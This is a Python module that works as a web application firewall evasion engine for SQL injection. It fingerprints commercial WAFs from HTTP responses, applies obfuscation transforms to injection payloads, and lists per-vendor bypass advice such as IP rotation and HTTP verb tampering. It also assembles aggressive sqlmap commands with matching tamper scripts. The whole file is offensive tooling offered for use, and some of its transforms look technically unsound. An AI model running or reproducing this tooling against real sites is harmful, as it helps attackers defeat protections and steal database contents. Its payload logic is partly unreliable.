# Advanced WAF Evasion and Payload Generation Engine
# Provides intelligent bypass techniques and custom payload generation.

import re
import base64
import urllib.parse
import random
import string
from typing import List, Dict, Tuple, Optional, Any
from dataclasses import dataclass
from enum import Enum
import hashlib
import json


class WAFType(Enum):
    
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    MODSECURITY = "modsecurity"
    IMPERVA = "imperva"
    BARRACUDA = "barracuda"
    F5_ASM = "f5_asm"
    FORTINET = "fortinet"
    SUCURI = "sucuri"
    AKAMAI = "akamai"
    GENERIC = "generic"


@dataclass
class EvasionTechnique:
    # Represents a WAF evasion technique
    name: str
    description: str
    transformation_func: callable
    waf_types: List[WAFType]
    success_rate: float
    detection_difficulty: int  # 1-10, higher is harder to detect


class WAFDetector:
    # Detects WAF presence and type from HTTP responses
    
    def __init__(self):
        self.waf_signatures = {
            WAFType.CLOUDFLARE: [
                "cloudflare", "cf-ray", "__cfduid", "cloudflare-nginx",
                "403 forbidden", "access denied"
            ],
            WAFType.AWS_WAF: [
                "x-amzn-requestid", "x-amz-cf-id", "awselb/",
                "blocked by aws waf"
            ],
            WAFType.MODSECURITY: [
                "mod_security", "modsecurity", "reference #",
                "not acceptable", "406 not acceptable"
            ],
            WAFType.IMPERVA: [
                "x-iinfo", "incap_ses", "visid_incap",
                "imperva", "incapsula"
            ],
            WAFType.BARRACUDA: [
                "barracuda", "barra", "blocked by barracuda"
            ],
            WAFType.F5_ASM: [
                "f5-bigip", "x-wa-info", "asm", "f5",
                "the requested url was rejected"
            ],
            WAFType.FORTINET: [
                "fortigate", "fortinet", "blocked by fortinet"
            ],
            WAFType.SUCURI: [
                "sucuri", "x-sucuri-id", "blocked by sucuri"
            ],
            WAFType.AKAMAI: [
                "akamai", "x-akamai", "reference #9"
            ]
        }
    
    def detect_waf(self, response_headers: Dict[str, str], response_body: str) -> Tuple[WAFType, float]:
        response_text = f"{str(response_headers)} {response_body}".lower()
        
        waf_scores = {}
        
        for waf_type, signatures in self.waf_signatures.items():
            score = 0
            for signature in signatures:
                if signature.lower() in response_text:
                    score += 1
            
            if score > 0:
                confidence = min(score / len(signatures), 1.0)
                waf_scores[waf_type] = confidence
        
        if waf_scores:
            best_match = max(waf_scores.items(), key=lambda x: x[1])
            return best_match[0], best_match[1]
        
        return WAFType.GENERIC, 0.1


class PayloadTransformer:
    # Advanced payload transformation engine
    
    def __init__(self):
        self.techniques = self._initialize_techniques()
    
    def _initialize_techniques(self) -> List[EvasionTechnique]:
        # Initialize evasion techniques
        return [
            EvasionTechnique(
                name="unicode_encoding",
                description="Unicode normalization bypass",
                transformation_func=self._unicode_encode,
                waf_types=[WAFType.CLOUDFLARE, WAFType.MODSECURITY],
                success_rate=0.7,
                detection_difficulty=8
            ),
            EvasionTechnique(
                name="case_variation",
                description="Mixed case keywords",
                transformation_func=self._case_variation,
                waf_types=[WAFType.GENERIC, WAFType.MODSECURITY],
                success_rate=0.6,
                detection_difficulty=4
            ),
            EvasionTechnique(
                name="comment_insertion",
                description="SQL comment insertion",
                transformation_func=self._comment_insertion,
                waf_types=[WAFType.IMPERVA, WAFType.BARRACUDA],
                success_rate=0.8,
                detection_difficulty=6
            ),
            EvasionTechnique(
                name="space_substitution",
                description="Replace spaces with alternatives",
                transformation_func=self._space_substitution,
                waf_types=[WAFType.F5_ASM, WAFType.FORTINET],
                success_rate=0.7,
                detection_difficulty=5
            ),
            EvasionTechnique(
                name="string_concatenation",
                description="Break strings using concatenation",
                transformation_func=self._string_concatenation,
                waf_types=[WAFType.AWS_WAF, WAFType.AKAMAI],
                success_rate=0.8,
                detection_difficulty=7
            ),
            EvasionTechnique(
                name="encoding_bypass",
                description="Multiple encoding layers",
                transformation_func=self._encoding_bypass,
                waf_types=[WAFType.SUCURI, WAFType.CLOUDFLARE],
                success_rate=0.6,
                detection_difficulty=9
            ),
            EvasionTechnique(
                name="function_bypass",
                description="Alternative SQL functions",
                transformation_func=self._function_bypass,
                waf_types=[WAFType.IMPERVA, WAFType.MODSECURITY],
                success_rate=0.7,
                detection_difficulty=6
            )
        ]
    
    def _unicode_encode(self, payload: str) -> str:
        # Unicode encoding transformation
        result = ""
        for char in payload:
            if char.isalpha() and random.random() < 0.3:
                # Unicode normalization bypass
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result
    
    def _case_variation(self, payload: str) -> str:
        # Mixed case variation
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'UPDATE', 'DELETE']
        result = payload
        
        for keyword in keywords:
            if keyword.lower() in result.lower():
                # Create mixed case version
                mixed_case = ""
                for i, char in enumerate(keyword):
                    mixed_case += char.upper() if i % 2 == 0 else char.lower()
                result = re.sub(keyword, mixed_case, result, flags=re.IGNORECASE)
        
        return result
    
    def _comment_insertion(self, payload: str) -> str:
        # Insert SQL comments to break detection
        comment_types = ["/**/", "/*comment*/", "-- ", "#"]
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR']
        
        result = payload
        for keyword in keywords:
            if keyword.lower() in result.lower():
                comment = random.choice(comment_types)
                # Insert comment in middle of keyword
                mid = len(keyword) // 2
                new_keyword = keyword[:mid] + comment + keyword[mid:]
                result = re.sub(keyword, new_keyword, result, flags=re.IGNORECASE)
        
        return result
    
    def _space_substitution(self, payload: str) -> str:
        # Replace spaces with alternative whitespace
        alternatives = ["\t", "\n", "\r", "\f", "\v", "+", "/**/"]
        
        result = payload
        spaces = re.findall(r'\s+', result)
        
        for space in set(spaces):
            replacement = random.choice(alternatives)
            result = result.replace(space, replacement, 1)
        
        return result
    
    def _string_concatenation(self, payload: str) -> str:
        # Break strings using SQL concatenation
        # Find quoted strings
        string_pattern = r"'([^']+)'"
        strings = re.findall(string_pattern, payload)
        
        result = payload
        for string_val in strings:
            if len(string_val) > 3:
                # Split string and concatenate
                mid = len(string_val) // 2
                part1 = string_val[:mid]
                part2 = string_val[mid:]
                concatenated = f"'{part1}'||'{part2}'"
                result = result.replace(f"'{string_val}'", concatenated, 1)
        
        return result
    
    def _encoding_bypass(self, payload: str) -> str:
        # Apply multiple encoding layers
        # URL encode some characters
        encoded = ""
        for char in payload:
            if char in "()=',;":
                encoded += urllib.parse.quote(char)
            elif random.random() < 0.2:  # Randomly encode some chars
                encoded += f"%{ord(char):02x}"
            else:
                encoded += char
        return encoded
    
    def _function_bypass(self, payload: str) -> str:
        # Replace common functions with alternatives
        function_alternatives = {
            'substring': ['substr', 'mid'],
            'ascii': ['ord'],
            'char': ['chr'],
            'concat': ['group_concat', '||'],
            'length': ['len', 'char_length'],
            'user()': ['current_user()', 'session_user()']
        }
        
        result = payload
        for func, alternatives in function_alternatives.items():
            if func.lower() in result.lower():
                alternative = random.choice(alternatives)
                result = re.sub(func, alternative, result, flags=re.IGNORECASE)
        
        return result
    
    def transform_payload(self, payload: str, waf_type: WAFType, num_techniques: int = 3) -> List[str]:
        # Apply multiple transformation techniques
        applicable_techniques = [
            t for t in self.techniques 
            if waf_type in t.waf_types or waf_type == WAFType.GENERIC
        ]
        
        # Sort by success rate and detection difficulty
        applicable_techniques.sort(key=lambda x: (x.success_rate, x.detection_difficulty), reverse=True)
        
        transformed_payloads = []
        
        # Apply single techniques
        for technique in applicable_techniques[:num_techniques]:
            try:
                transformed = technique.transformation_func(payload)
                transformed_payloads.append(transformed)
            except Exception:
                continue
        
        # Apply combination techniques
        if len(applicable_techniques) >= 2:
            for i in range(min(3, len(applicable_techniques) - 1)):
                try:
                    combined = payload
                    for j in range(2):
                        technique = applicable_techniques[i + j]
                        combined = technique.transformation_func(combined)
                    transformed_payloads.append(combined)
                except Exception:
                    continue
        
        return transformed_payloads


class EvasionEngine:
    # Main evasion engine coordinating detection and transformation
    
    def __init__(self):
        self.waf_detector = WAFDetector()
        self.payload_transformer = PayloadTransformer()
        self.session_data = {}
    
    def analyze_response(self, response_headers: Dict[str, str], response_body: str, url: str) -> Dict[str, Any]:
        # Analyze HTTP response for WAF detection
        waf_type, confidence = self.waf_detector.detect_waf(response_headers, response_body)
        
        analysis = {
            "waf_detected": confidence > 0.3,
            "waf_type": waf_type.value,
            "confidence": confidence,
            "blocked_indicators": self._check_blocking_indicators(response_body),
            "recommendations": self._get_recommendations(waf_type, confidence)
        }
        
        # Store session data
        self.session_data[url] = analysis
        
        return analysis
    
    def _check_blocking_indicators(self, response_body: str) -> List[str]:
        # Check for common blocking indicators
        indicators = []
        blocking_patterns = [
            (r"403\s+forbidden", "403 Forbidden"),
            (r"access\s+denied", "Access Denied"),
            (r"request\s+blocked", "Request Blocked"),
            (r"suspicious\s+activity", "Suspicious Activity"),
            (r"security\s+violation", "Security Violation"),
            (r"malicious\s+request", "Malicious Request"),
            (r"sql\s+injection", "SQL Injection Detection"),
            (r"attack\s+detected", "Attack Detected")
        ]
        
        response_lower = response_body.lower()
        for pattern, description in blocking_patterns:
            if re.search(pattern, response_lower):
                indicators.append(description)
        
        return indicators
    
    def _get_recommendations(self, waf_type: WAFType, confidence: float) -> List[str]:
        # Get evasion recommendations based on WAF type
        recommendations = []
        
        if confidence > 0.7:
            if waf_type == WAFType.CLOUDFLARE:
                recommendations.extend([
                    "Use time-based blind injection techniques",
                    "Try Unicode normalization bypasses",
                    "Use HTTP parameter pollution",
                    "Consider IP rotation strategies"
                ])
            elif waf_type == WAFType.MODSECURITY:
                recommendations.extend([
                    "Use comment-based evasion",
                    "Try case variation techniques",
                    "Use nested SQL functions",
                    "Consider HTTP verb tampering"
                ])
            elif waf_type == WAFType.IMPERVA:
                recommendations.extend([
                    "Use string concatenation",
                    "Try encoding bypass techniques",
                    "Use alternative SQL functions",
                    "Consider payload fragmentation"
                ])
            else:
                recommendations.extend([
                    "Use generic evasion techniques",
                    "Try multiple encoding layers",
                    "Use time delays to avoid detection",
                    "Consider payload obfuscation"
                ])
        
        return recommendations
    
    def generate_evasion_payloads(self, base_payload: str, url: str, count: int = 5) -> List[Dict[str, Any]]:
        # Generate evasion payloads for detected WAF
        if url in self.session_data:
            waf_type = WAFType(self.session_data[url]["waf_type"])
        else:
            waf_type = WAFType.GENERIC
        
        transformed_payloads = self.payload_transformer.transform_payload(
            base_payload, waf_type, count
        )
        
        payload_data = []
        for i, payload in enumerate(transformed_payloads):
            payload_data.append({
                "payload": payload,
                "technique": f"evasion_{i+1}",
                "waf_target": waf_type.value,
                "original": base_payload
            })
        
        return payload_data
    
    def get_tamper_scripts(self, waf_type: WAFType) -> List[str]:
        # Get recommended SQLMap tamper scripts for WAF type
        tamper_map = {
            WAFType.CLOUDFLARE: [
                "between", "charencode", "charunicodeencode", "equaltolike",
                "greatest", "halfversionedmorekeywords", "randomcase"
            ],
            WAFType.MODSECURITY: [
                "apostrophemask", "apostrophenullencode", "base64encode",
                "between", "chardoubleencode", "charencode", "charunicodeencode",
                "equaltolike", "greatest", "halfversionedmorekeywords",
                "ifnull2ifisnull", "modsecurityversioned", "modsecurityzeroversioned",
                "multiplespaces", "nonrecursivereplacement", "percentage",
                "randomcase", "randomcomments", "securesphere", "space2comment",
                "space2hash", "space2morehash", "space2mssqlblank", "space2mssqlhash",
                "space2mysqlblank", "space2mysqldash", "space2plus", "space2randomblank",
                "unionalltounion", "unmagicquotes", "versionedkeywords",
                "versionedmorekeywords"
            ],
            WAFType.IMPERVA: [
                "base64encode", "between", "chardoubleencode", "charencode",
                "charunicodeencode", "equaltolike", "greatest", "halfversionedmorekeywords",
                "randomcase", "securesphere", "space2comment", "space2plus",
                "space2randomblank", "unionalltounion", "versionedkeywords"
            ],
            WAFType.AWS_WAF: [
                "between", "charencode", "charunicodeencode", "equaltolike",
                "greatest", "randomcase", "space2comment", "space2plus"
            ],
            WAFType.F5_ASM: [
                "between", "charencode", "equaltolike", "greatest",
                "halfversionedmorekeywords", "randomcase", "space2comment",
                "space2hash", "space2plus", "versionedkeywords"
            ],
            WAFType.GENERIC: [
                "between", "charencode", "randomcase", "space2comment", "space2plus"
            ]
        }
        
        return tamper_map.get(waf_type, tamper_map[WAFType.GENERIC])
    
    def create_sqlmap_command(self, base_url: str, detected_waf: Optional[WAFType] = None) -> str:
        # Create optimized SQLMap command based on WAF detection
        if detected_waf:
            tamper_scripts = self.get_tamper_scripts(detected_waf)
            tamper_string = ",".join(tamper_scripts[:5])  # Use top 5 scripts
            
            command_parts = [
                f"sqlmap -u '{base_url}'",
                "--batch",
                f"--tamper={tamper_string}",
                "--risk=3",
                "--level=5",
                "--technique=BEUSTQ",
                "--threads=10",
                "--time-sec=2",
                "--timeout=30",
                "--retries=3"
            ]
            
            return " ".join(command_parts)
        else:
            return f"sqlmap -u '{base_url}' --batch --dbs"


# Global evasion engine instance
evasion_engine = EvasionEngine()
